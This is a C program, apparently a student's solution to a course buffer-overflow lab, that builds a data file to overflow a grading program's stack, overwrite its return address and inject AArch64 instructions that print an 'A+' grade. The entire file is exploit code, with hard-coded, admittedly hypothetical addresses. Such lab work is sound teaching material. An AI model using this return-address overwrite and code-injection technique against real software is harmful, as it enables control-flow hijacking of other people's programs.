/* createdataAplus.c
   Purpose: To create a file called dataAplus which when used with the grader
   program manipulates it to output an "A+" grade. The approach involves
   injecting the "A+" string directly into the stack, overwriting the return
   address to redirect execution to our crafted instruction sequence. */

#include <stdio.h>
#include "miniassembler.h"
#include <string.h>

int main(void) {
    FILE *dataAplus;
    unsigned int payloadAddress, printfAddress;
    unsigned int ldrInstr, blInstr;

    /* Open file for writing */
    dataAplus = fopen("dataAplus", "w+");
    if (dataAplus == NULL) {
        perror("Error opening file");
        return -1;
    }

    /* Write student names and null byte */
    fprintf(dataAplus, "Alex & Matt");
    putc('\0', dataAplus);

    /* Addresses must be adjusted based on the actual memory layout */
    printfAddress = 0x400690; // Hypothetical address of printf in grader
    payloadAddress = MiniAssembler_adr(0, 0x420044, 0x420064);

    /* Overwrite return address with the address of our payload */
    fwrite(&payloadAddress, sizeof(payloadAddress), 1, dataAplus);

    /* Payload setup: load the address of "A+" string into a register */
    unsigned long aPlusStringAddress = 0x420048; // Adjust based on memory layout
    ldrInstr = MiniAssembler_ldr(0, aPlusStringAddress);
    fwrite(&ldrInstr, sizeof(ldrInstr), 1, dataAplus);

    /* Branch to printf to print using the X0 register */
    blInstr = MiniAssembler_bl(printfAddress, 0x42006c);
    fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);

    /* Branch back to main function after printf */
    blInstr = MiniAssembler_bl(0x40089c, printfAddress);
    fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);

    /* Inject the "A+" string into the stack */
    const char *aPlusString = "A+\0";
    fwrite(aPlusString, strlen(aPlusString) + 1, 1, dataAplus);

    /* Padding to overrun the stack */
    for (int i = 0; i < 20; i++) {
        putc('A', dataAplus);
    }

    /* Close the file */
    fclose(dataAplus);
    return 0;
}
